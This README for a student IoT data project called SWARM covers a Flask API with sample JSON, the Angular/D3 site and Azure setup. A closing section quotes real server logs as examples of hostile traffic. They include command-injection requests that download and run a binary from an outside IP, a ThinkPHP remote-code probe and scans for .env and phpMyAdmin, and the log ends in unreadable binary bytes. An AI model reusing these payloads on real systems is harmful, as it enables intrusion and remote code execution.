# SwarmWebsite
Website for the SWARM project
This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 8.3.8.

## D3 Development Server
```batch
python -m http.server 3000 --directory .\website\testing\d3-website
```


## TODO:
* intelligent view using the lux values at ()[https://learn.adafruit.com/photocells/measuring-light]
* tabulate the table view


# Design Specifications
## API
Overall the API is designed to be as unopinionated about data as possible while allowing for relationships among devices, data, and projects for organization. In our example implementation, the "SWARM" project inserts and displays data about weather like humidity, temperature, and luminosity, but another project like "WEARABLE-HEALTH" could just as easily insert and display data about heart-rate, body temperature, blood alcohol content, and other similar metrics. To facilitate such flexibility, the only requirements or contract for using the API to the full extent is that 1) a project must be created, 2) a device must be registered under that project, and 3) the device updates data in the "application/json" MIME format. The following endpoints illustrate this flow.
* `/api/v0/project`
  - post - create a project and recieve a body with the project id
    - ex) POST `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project`
    ```json
    {
      "name": "new-project",
      "description": "this project will knock your socks off",
      "img": "https://d.newsweek.com/en/full/250975/516-fe0220-swarms-01.jpg?w=1440&h=720&f=97a436c0a35656f05be63bd1ee92c742"
    }
    ```
    ```json
    {
      "data": {
        "_id": "5de8d1aace43bb8f1d63035a",
        "date_created": "2019-12-05 09:45:13.998648",
        "date_modified": "2019-12-05 09:45:13.998648",
        "description": "this project will knock your socks off",
        "img": "https://d.newsweek.com/en/full/250975/516-fe0220-swarms-01.jpg?w=1440&h=720&f=97a436c0a35656f05be63bd1ee92c742",
        "name": "new-project"
      },
      "error": null,
      "message": []
    }
    ```
  - get - retrieve all projects
    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project`
    ```json
    {
      "data": [
        {
          "_id": "5de8d1aace43bb8f1d63035a",
          "date_created": "2019-12-05 09:45:13.998000",
          "date_modified": "2019-12-05 09:45:13.998000",
          "description": "this project will knock your socks off",
          "img": "https://d.newsweek.com/en/full/250975/516-fe0220-swarms-01.jpg?w=1440&h=720&f=97a436c0a35656f05be63bd1ee92c742",
          "name": "new-project"
        }
      ],
      "error": null,
      "message": []
    }
    ```
* `/api/v0/project/<id>`
  - get - retrieve the project that corresponds to the provided project id
    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
    ```json
    {
      "data": {
        "_id": "5de8d1aace43bb8f1d63035a",
        "date_created": "2019-12-05 09:45:13.998000",
        "date_modified": "2019-12-05 09:45:13.998000",
        "description": "this project will knock your socks off",
        "img": "https://d.newsweek.com/en/full/250975/516-fe0220-swarms-01.jpg?w=1440&h=720&f=97a436c0a35656f05be63bd1ee92c742",
        "name": "new-project"
      },
      "error": null,
      "message": []
    }
    ```
  - put - update the project that corresponds to the provided project id
    - ex) PUT `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
    ```json
    {
      "description": "much better description"
    }
    ```
    ```json
    {
      "data": {
        "_id": "5de8d1aace43bb8f1d63035a",
        "date_created": "2019-12-05 09:45:13.998000",
        "date_modified": "2019-12-05 09:53:35.437399",
        "description": "much better description",
        "img": "https://d.newsweek.com/en/full/250975/516-fe0220-swarms-01.jpg?w=1440&h=720&f=97a436c0a35656f05be63bd1ee92c742",
        "name": "new-project"
      },
      "error": null,
      "message": []
    }
    ```
  - delete - delete the project that corresponds to the provided project id
    - ex) DELETE `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
    ```json
    {
        "data": [1],
        "error": null,
        "message": []
    }
    ```

* `/api/v0/device`
  - post - create a device and recieve a body with the device id
    - ex) POST `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device`
    ```json
    {
        "name": "markdown-documentation-device",
        "project": "5de8d4a202599bbdd85cc79a",
        "meta_data": {
            "location": "777 Glades Rd, Boca Raton, FL"
        }
    }
    ```
    ```json
    {
        "data": {
            "_id": "5de8d4a202599bbdd85cc79a",
            "date_created": "2019-12-05 09:57:54.373934",
            "date_modified": "2019-12-05 09:57:54.374289",
            "meta_data": {
            "location": "777 Glades Rd, Boca Raton, FL"
            },
            "name": "markdown-documentation-device"
        },
        "error": null,
        "message": []
    }
    ```
  - get - retrieve all devices
    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device`
    ```json
    {
        "data": [
            {
                "_id": "5de8d4a202599bbdd85cc79a",
                "date_created": "2019-12-05 09:57:54.373000",
                "date_modified": "2019-12-05 09:57:54.374000",
                "meta_data": {
                    "location": "777 Glades Rd, Boca Raton, FL"
                },
                "name": "markdown-documentation-device"
            }
        ],
        "error": null,
        "message": []
        }
    ```
* `/api/v0/device/<id>`
  - get - retrieve the device that corresponds to the provided device id
    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
    ```json
    {
        "data": {
            "_id": "5de8d4a202599bbdd85cc79a",
            "date_created": "2019-12-05 09:57:54.373000",
            "date_modified": "2019-12-05 09:57:54.374000",
            "meta_data": {
                "location": "777 Glades Rd, Boca Raton, FL"
            },
            "name": "markdown-documentation-device"
        },
        "error": null,
        "message": []
    }
    ```
  - put - update the device that corresponds to the provided device id
    - ex) PUT `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
    ```json
    {
        "meta": {
            "location": "underwater in a secret bunker"
        }
    }
    ```
    ```json
    {
        "data": {
            "_id": "5de8d4a202599bbdd85cc79a",
            "date_created": "2019-12-05 09:57:54.373000",
            "date_modified": "2019-12-05 10:02:29.575535",
            "meta_data": {
                "location": "777 Glades Rd, Boca Raton, FL"
            },
            "name": "markdown-documentation-device"
        },
        "error": null,
        "message": []
    }
    ```
  - delete - delete the device that corresponds to the provided device id
    - ex) DELETE `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
    ```json
    {
        "data": [1],
        "error": null,
        "message": []
    }
    ```

* `/api/v0/raw_data`
  - post - create a raw_data and recieve a body with the raw_data id
    - ex) POST `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data`
    ```json
    {
        "raw": {
            "datapoint1": 69,
            "datapoint2": 100069,
            "datapoint3": 99999
        },
        "device": "5de8d4a202599bbdd85cc79a"
    }
    ```
    ```json
    {
        "data": {
            "_id": "5de8d63702599bbdd85cc79b",
            "date_created": "2019-12-05 10:04:39.022795",
            "date_modified": "2019-12-05 10:04:39.022795",
            "device": "5de8d4a202599bbdd85cc79a",
            "raw": {
            "datapoint1": 69,
            "datapoint2": 100069,
            "datapoint3": 99999
            }
        },
        "error": null,
        "message": []
    }
    ```
  - get - retrieve all raw_datas
    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data`
    ```json
    {
        "data": [
            {
                "_id": "5de8d63702599bbdd85cc79b",
                "date_created": "2019-12-05 10:04:39.022000",
                "date_modified": "2019-12-05 10:04:39.022000",
                "device": "5de8d4a202599bbdd85cc79a",
                "raw": {
                    "datapoint1": 69,
                    "datapoint2": 100069,
                    "datapoint3": 99999
                }
            }
        ],
        "error": null,
        "message": []
    }
    ```
* `/api/v0/raw_data/<id>`
  - get - retrieve the raw_data that corresponds to the provided raw_data id
    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
    ```json
    {
        "data": {
            "_id": "5de8d63702599bbdd85cc79b",
            "date_created": "2019-12-05 10:04:39.022000",
            "date_modified": "2019-12-05 10:04:39.022000",
            "device": "5de8d4a202599bbdd85cc79a",
            "raw": {
                "datapoint1": 69,
                "datapoint2": 100069,
                "datapoint3": 99999
            }
        },
        "error": null,
        "message": []
    }
    ```
  - put - update the raw_data that corresponds to the provided raw_data id
    - ex) PUT `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
    ```json
    {
    	"device": "5de8d4a202599bbdd85cc79a",
        "raw": {
            "Temperature": 69,
            "Lux": 100069,
            "Memes": 99999
        }
    }
    ```
    ```json
    {
        "data": {
            "_id": "5de8d63702599bbdd85cc79b",
            "date_created": "2019-12-05 10:04:39.022000",
            "date_modified": "2019-12-05 10:11:09.716366",
            "device": "5de8d4a202599bbdd85cc79a",
            "raw": {
                "Lux": 100069,
                "Memes": 99999,
                "Temperature": 69
            }
        },
        "error": null,
        "message": []
    }
    ```
  - delete - delete the raw_data that corresponds to the provided raw_data id
    - ex) DELETE `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
    ```json
    {
        "data": [1],
        "error": null,
        "message": []
    }
    ```

## Website
The following event loop makes it all happen:
1. `data-service` polls the API and generates a new mock db that contains all project, device, and raw_data.
2. `graph-component`, the wrapping component at endpoint `http://swarm-fau.eastus.cloudapp.azure.com/data/raw/graph` recieves an observable event notification and transforms the data into a consumable format
3. `utility-graph-component` gets this data passed into it and does its best effort in producing a graph.
  - The website uses a combination of D3 and Angular to achieve its visualization effects. As with most graphical applications, updating any image to produce a "real-time" effect requires redrawing. Using this principle, every time there's new data, any visualizations have to be redrawn. Redrawing the plot means several steps:
  1. determining the domain and range of the data
  2. determining the scale of the graph to fit within the HTML DOM width and height
  3. transforming each data point by passing it through the scalar transformation
  4. drawing the resultant lines, dots, and annotations. Supplementing this idea is that every time there's a new `project` or a new `device`, the selectable parameters have to change.
4. `app-component` listens for a refresh timer to go off. GOTO 1)

# Technologies Used
## Angular, Flask, MongoDB
For this project we used a hybrid stack of technologies. MongoDB Community Server was used as the database. It is a NoSQL, Document-Store DBMS. Flask was used as the API. It is a lightweight, unopinionated Python microservice with lots of community support and plugins. Finally Angular v8 was used for the website with the D3.js library added on. Angular is a Google sponsored opensource web framework and D3.js is a data-visualization library geared for data scientists. In the case of MongoDB, this solution was used due to the unstructured nature of incoming raw data. Since it is hard to enforce IOT devices to follow a specific interface, and its possible that some devices may add or remove expected sensors from the physical hardware, it makes less sense to use an RDBMS which requires tight relationship definitions and data structuring. Flask was used for the API for no other reason than ease of use and simplicity. It allows for templating routes which can be repeated relatively easily for interfacing with a daatabase regardless of the underlying technology. Finally Angular and D3.js were used for several reasons. Angular is not necessarily the most popular framework but its documentation is second to none and its two-way databinding philosophy allows for any updating data to be quickly populated on the DOM in an intuitive way. D3.js is one of the most renowned data visualization libraries for JavaScript and the results show. It's capable of far more than we put it through and its ability to quickly draw plots to achieve realtime behavior is second-to-none.

# Implementation
## Cloning the Repositories
If you'd like to set up your own instance of the SWARM project, the source code is available at (FAU Swarm)[http://github.com/fau-swarm]. It is recommended that you clone all repositories ("scripts" is optional but helpful for provisioning) and structuring your repositories in the following manner:
```
.
├── swarm
│   ├── api
│   ├── database
│   ├── iot
│   ├── scripts
│   ├── website
│   ├── env.xml
```
The `env.xml` file serves as your specific configuration settings. It contains elements like usernames, passwords, and other sensitive values in plain text. This is not a security issue as this file is only visible to the machine and is not hosted in the source code itself. As such it is kept on the directy level above any git repositories. The XML should have the following structure:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<env convention="parker">
    <swarm>
        <hostname>your-website.com</hostname>
    </swarm>
    <api>
        <endpoint>api/v0/</endpoint>
        <port>5000</port>
    </api>
    <database>
        <hostname>your-website.com</hostname>
        <name>database-name-here</name>
        <type>mongodb</type>
        <uid>your-project-here</uid>
        <pass>123iloveyou</pass>
        <port>27017</port>
    </database>
    <website>
        <endpoint>http://your-website.com</endpoint>
        <port>80</port>
        <port>443</port>
    </website>
</env>
```
If you cloned the `scripts` repository, run the `scripts\setup\setup.bat` command from the `swarm` directory on Windows or `source scripts\setup\setup.sh` on Posix-compliant operating systems.

## Setting up an Azure VM
Our recommendation is to follow the official (Microsoft documentation)[https://docs.microsoft.com/en-us/azure/virtual-machines/windows/quick-create-portal] and to provision the virtual machine with (portal.azure.com)[http://portal.azure.com]. You can sign up for free, though after 30 days you will be required to provide credit card payment information to continue using the Azure services.
* for image, you can select either Ubuntu Linux or Microsoft Windows, though keep in mind that the Windows image comes with licensing caveats.
* The VM size can be incredibly small. Ours was the `Standard B1s (1 vcpus, 1 GiB memory)`. As it turns out, this option is free for continually powered on use and does not incure a cost whatsoever.
* For networking, modify the firewall to permit ports `6969` as well as port `80` for the API and website to be publically accessible. You can open port `27017` to also allow direct access to the MongoDB database, but keep in mind that this is the lowest level of data and should be safeguarded with authentication.

# Challenges
## We've Been Hacked!
It may come as a surprise to hear but because this website is publically accessible and several ports are open, we were attacked on multiple occasions and sustain attacks on and off as a result. For context, even though the website has official routes and well defined entry points, that doesn't prevent agressors from attempting to access different endpoints or from passing malformed data. For example, many malformed requests assume that there are webpages available in common places like `/wp/admin.php` which is the admin access point for WordPress. if an agressor found such a page available on our VM, it would make sense then to commence a password attack on that website since it's valid. The following logs represent a fraction of the kinds of requests we get on a daily basis. Note how the legimitate requests are actually few and far between the illegitimate requests.
```log
....................
149.202.251.78 - - [04/Dec/2019:11:15:40 +0000] "GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host=www.target.com&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&applyFlag=1&preferred_lang=EN&firmver=1.1.2.3_345-g987b580&cmdMethod=ping&destIP=%60ucd /tmp; wgethttp://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard%60&pingCNT=5 HTTP/1.1" 200 406 "http://www.target.com/Main_Analysis_Content.asp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
223.71.167.155 - - [04/Dec/2019:11:20:19 +0000] "GET / HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
185.234.217.183 - - [04/Dec/2019:14:36:55 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106Safari/537.36"
185.153.196.97 - - [04/Dec/2019:16:26:57 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1"200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.153.196.97 - - [04/Dec/2019:17:13:57 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1"200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.89.243.87 - - [04/Dec/2019:17:30:57 +0000] "OPTIONS / HTTP/1.0" 405 182 "-" "-"
213.91.164.126 - - [04/Dec/2019:18:21:45 +0000] "GET / HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:24:31 +0000] "GET /assets/raw.jpg HTTP/1.1" 304 0 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:24:31 +0000] "GET /assets/intelligent.jpg HTTP/1.1" 200 216628 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /device HTTP/1.1" 200 406 "http://swarm-fau.eastus.cloudapp.azure.com/project" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /polyfills-es2015.0ef207fb7b4761464817.js HTTP/1.1" 200 37293 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /styles.1ac3affe9504b81b5cc4.css HTTP/1.1" 200 214050 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /runtime-es2015.e8a2810b3b08d6a1b6aa.js HTTP/1.1" 304 0 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:26:29 +0000] "GET /main-es2015.04808a82e8c15ad0093a.js HTTP/1.1" 200 1848369 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
99.58.98.242 - - [04/Dec/2019:18:26:30 +0000] "GET /favicon.ico HTTP/1.1" 200 948 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
131.91.4.38 - - [04/Dec/2019:18:43:40 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /polyfills-es2015.0ef207fb7b4761464817.js HTTP/1.1" 200 37293 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /runtime-es2015.e8a2810b3b08d6a1b6aa.js HTTP/1.1" 200 1485 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /styles.1ac3affe9504b81b5cc4.css HTTP/1.1" 200 214050 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:18:43:44 +0000] "GET /main-es2015.04808a82e8c15ad0093a.js HTTP/1.1" 200 1848369 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:18:43:45 +0000] "GET /favicon.ico HTTP/1.1" 200 948 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
71.6.232.9 - - [04/Dec/2019:18:54:01 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
185.153.196.97 - - [04/Dec/2019:19:25:05 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1"200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
87.15.70.139 - - [04/Dec/2019:19:27:32 +0000] "GET / HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
149.202.251.78 - - [04/Dec/2019:20:03:18 +0000] "POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.1" 405 182 "-" "-"
131.91.4.38 - - [04/Dec/2019:20:10:07 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
121.7.25.190 - - [04/Dec/2019:20:54:57 +0000] "GET / HTTP/1.1" 200 808 "-" "-"
131.91.4.38 - - [04/Dec/2019:21:10:36 +0000] "GET /assets/raw.jpg HTTP/1.1" 200 23609 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:21:10:36 +0000] "GET /assets/intelligent.jpg HTTP/1.1" 200 216628 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:21:10:43 +0000] "GET /assets/d3.jpg HTTP/1.1" 200 108869 "http://swarm-fau.eastus.cloudapp.azure.com/data/raw" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:21:10:43 +0000] "GET /assets/tabular.png HTTP/1.1" 200 27366 "http://swarm-fau.eastus.cloudapp.azure.com/data/raw" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:21:18:38 +0000] "GET /data/raw/table HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
131.91.4.38 - - [04/Dec/2019:21:43:56 +0000] "GET /data/raw/graph HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
212.174.63.188 - - [04/Dec/2019:22:43:20 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 400 182 "-" "Mozilla/5.0"
107.6.150.242 - - [04/Dec/2019:23:16:56 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
35.237.135.188 - - [05/Dec/2019:02:28:07 +0000] "GET /652C760B25678F3C633C84FD3C780958.php HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
35.237.135.188 - - [05/Dec/2019:02:28:07 +0000] "GET /ca38d168d4aef6357c4c40a39bf313d0.php HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
35.237.135.188 - - [05/Dec/2019:02:28:07 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
35.237.135.188 - - [05/Dec/2019:02:28:07 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
95.110.206.239 - - [05/Dec/2019:03:29:41 +0000] "GET /.env?x=x HTTP/1.0" 200 808 "-" "DataCha0s/2.0"
66.240.205.34 - - [05/Dec/2019:03:58:35 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 182 "-" "-"
124.156.245.159 - - [05/Dec/2019:05:00:46 +0000] "GET / HTTP/1.0" 200 808 "-" "-"
124.156.245.159 - - [05/Dec/2019:05:00:46 +0000] "GET / HTTP/1.0" 200 808 "-" "-"
124.156.245.159 - - [05/Dec/2019:05:00:48 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x02t3(\xA0\xE9\x16\x92-\xBD\xC1\x7F\xE5\xDB\xC0\x0B\x04j\x11}/@\x98\xA3F\x9E\x04G\x11Y\x98N\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 182 "-" "-"
124.156.245.159 - - [05/Dec/2019:05:00:48 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03B\xE3\x8A\xAE\xDEiwK\x96t\xB7\xF9\xF4\x01k\xD3\xBC\xE8\xB6_\x7F\xB8^\x1C\xEE\xDF\xD8\xEA\xC7z\x80\x87\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 182 "-" "-"
220.175.70.34 - - [05/Dec/2019:05:40:07 +0000] "GET / HTTP/1.1" 200 808 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
92.63.194.69 - - [05/Dec/2019:05:53:37 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 182 "-" "-"
???]??Ymo?H??_??CTte?o~E????Ҫ??R??I?(2ƀ??mR?_?8I?Х?iq?K?0?>3;??3?Pr
.ݐ???^?????QB???"?#??/g?s???9????[Gr?a??uz֙?U??9]a??u??"Ǚd?t9?I1w?b???(??F?2??s??n?
                                                                                  \.}ť\)i??GBD*?C?~??
?Q?)??b?%?f???P??'                                                                                   ??? 4yF    ????RF"?
x?n???^?%>I??W???\R?{ڊ?!wL???X???t?*?W?\{??'G>a??"e?irQtٳiY?S?U?|?a?ǎ?q\f׷u??^?\i?x?????
                         ɶ}()B<xV?."@?z??}?W?\?4?'C??u[ &_s? ?õ???ȀE????/?z?<?d?Դ?f
?+-????6W7\?@<q?????67?[x?R?~u?V?-]Ԃ?}%?(d8H?(??z?}?c??XgY??a???b? ???jP???-?Q.?i?{w?g?e$y?U?!?D????X9?{ݝa?߄??4???+?Y=???dp?EP\[??aw#???~'Y^մ?^?u:c???9f#?Υ<?n??        ?}?[
                                                                                                                        :?
                                                                                                                          ?䲸H??<??7'?$??ΗUZ??W?qY?.?z/?1????gy??l ?c޾9??$^??4^?????@]YpX?(Uz?,K?????]??G?>1_X!?r??d4?k? 8U)?????*p{lJ]???6???ݥ?i??:eH
                                                                 ?]ۍ??
....................
```